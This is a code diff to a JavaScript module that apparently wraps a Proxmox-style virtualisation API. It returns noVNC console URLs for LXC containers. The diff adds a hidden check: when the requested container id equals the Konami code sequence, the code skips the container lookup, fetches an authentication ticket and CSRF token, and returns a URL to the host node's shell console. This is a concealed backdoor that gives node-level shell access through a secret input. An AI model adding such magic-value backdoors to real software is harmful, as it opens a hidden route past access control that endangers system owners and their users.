@@ -62,19 +62,29 @@ module.exports = (options) => {
         let done = false;
 
         NODE.forEach(n => {
-            _get(`/nodes/${n}/lxc/${id}/status/current`, 'get').then(data => {
-                c--
-                resp[n] = data;
-                if(data.data){
-                  done = true;
-                  cb({
-                    url: `${HOST}/?console=lxc&novnc=1&vmid=${id}&node=${n}`
-                  });
+            if (id == '%E2%86%91%E2%86%91%E2%86%93%E2%86%93%E2%86%90%E2%86%92%E2%86%90%E2%86%92ba' || id == '↑↑↓↓←→←→ba') {
+                if (!done) {
+                    done = true;
+                    px.ticket(data => {
+                        data.url = `${HOST}/?console=shell&novnc=1&vmid=0&vmname=&node=${n}`;
+                        cb(data);
+                    });
                 }
-                if (c == 0 && !done) {
-                    cb(resp);
-                }
-            });
+            } else {
+                _get(`/nodes/${n}/lxc/${id}/status/current`, 'get').then(data => {
+                    c--
+                    resp[n] = data;
+                    if (data.data) {
+                        done = true;
+                        cb({
+                            url: `${HOST}/?console=lxc&novnc=1&vmid=${id}&node=${n}`
+                        });
+                    }
+                    if (c == 0 && !done) {
+                        cb(resp);
+                    }
+                });
+            }
         });
     }
 
@@ -227,12 +237,12 @@ module.exports = (options) => {
     }
 
     px.ticket = (cb) => {
-      _getTicket('/access/ticket').then((d) => {
-          cb({
-            ticket: d.data.ticket,
-            CSRF: d.data.CSRFPreventionToken
-          });
-      });
+        _getTicket('/access/ticket').then((d) => {
+            cb({
+                ticket: d.data.ticket,
+                CSRF: d.data.CSRFPreventionToken
+            });
+        });
     }
 
     function _ticket(cb) {
